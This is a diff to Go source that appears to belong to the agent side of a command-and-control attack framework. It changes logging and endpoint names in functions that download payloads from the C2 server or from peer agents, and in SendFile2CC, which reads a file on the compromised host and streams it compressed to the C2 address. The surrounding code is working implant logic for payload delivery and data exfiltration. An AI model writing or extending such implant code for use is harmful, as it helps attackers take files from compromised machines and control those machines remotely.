@@ -37,6 +37,7 @@ func SmartDownload(download_addr, file_to_download, path, checksum string) (data
 	// if download_host is given, download from the specified agent
 	if download_addr != "" {
 		// download from other agent
+		log.Printf("SmartDownload: downloading from %s", download_addr)
 		err = DownloadFromPeerKCP(download_addr, file_to_download, path, checksum)
 		if util.IsFileExist(path) {
 			// checksum
@@ -54,8 +55,8 @@ func SmartDownload(download_addr, file_to_download, path, checksum string) (data
 // if path is empty, return []data instead
 func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err error) {
 	url := fmt.Sprintf("%s%s/%s?file_to_download=%s",
-		def.CCAddress, transport.FileAPI, url.QueryEscape(common.RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
-	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
+		def.CCAddress, transport.PutAPI, url.QueryEscape(common.RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
+	log.Printf("DownloadViaCC is downloading from %s", url)
 	retData := false
 	if path == "" {
 		retData = true
@@ -72,8 +73,9 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 		os.Create(lock)
 	}
 
-	// use EmpHTTPClient if no path specified
+	// if no path specified
 	if retData {
+		log.Printf("Downloading %s to memory", url)
 		client := transport.EmpHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 		if client == nil {
 			err = fmt.Errorf("failed to initialize HTTP client")
@@ -108,6 +110,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 	}
 
 	// use grab
+	log.Printf("Downloading %s to %s", url, path)
 	client := grab.NewClient()
 	client.HTTPClient = transport.EmpHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 	if client.HTTPClient == nil {
@@ -139,15 +142,15 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 		case <-resp.Done:
 			err = resp.Err()
 			if err != nil {
-				err = fmt.Errorf("DownloadViaCC finished with error: %v", err)
+				err = fmt.Errorf("finished with error: %v", err)
 				log.Print(err)
 				return
 			}
 			if checksum != crypto.SHA256SumFile(path) {
-				err = fmt.Errorf("DownloadViaCC checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
+				err = fmt.Errorf("checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
 				return
 			}
-			log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size())
+			log.Printf("saved %s to %s (%d bytes)", url, path, resp.Size())
 			return
 		case <-t.C:
 			log.Printf("%.02f%% complete", resp.Progress()*100)
@@ -164,7 +167,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	// open and read the target file
 	f, err := os.Open(filepath)
 	if err != nil {
-		err = fmt.Errorf("sendFile2CC: failed to open %s: %v", filepath, err)
+		err = fmt.Errorf("failed to open %s: %v", filepath, err)
 		return
 	}
 	defer f.Close()
@@ -172,19 +175,19 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	// seek offset
 	_, err = f.Seek(offset, 0)
 	if err != nil {
-		err = fmt.Errorf("sendFile2CC: failed to seek %d in %s: %v", offset, filepath, err)
+		err = fmt.Errorf("failed to seek %d in %s: %v", offset, filepath, err)
 		return
 	}
 
 	// connect
 	url := fmt.Sprintf("%s%s/%s",
 		def.CCAddress,
-		transport.FTPAPI,
+		transport.GetAPI,
 		token)
 	conn, _, _, err := ConnectCC(url)
-	log.Printf("sendFile2CC: connection: %s", url)
+	log.Printf("connection: %s", url)
 	if err != nil {
-		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
+		err = fmt.Errorf("connection failed: %v", err)
 		return
 	}
 	defer conn.Close()
@@ -192,7 +195,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	// open compressor
 	compressor, err := archives.Zstd{}.OpenWriter(conn)
 	if err != nil {
-		err = fmt.Errorf("sendFile2CC: failed to open compressor: %v", err)
+		err = fmt.Errorf("failed to open compressor: %v", err)
 		return
 	}
 	defer compressor.Close()
@@ -200,7 +203,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	freader := bufio.NewReader(f)
 	n, err := io.Copy(compressor, freader)
 	if err != nil {
-		log.Printf("sendFile2CC failed, %d bytes transfered: %v", n, err)
+		log.Printf("failed, %d bytes transfered: %v", n, err)
 	}
 	return
 }
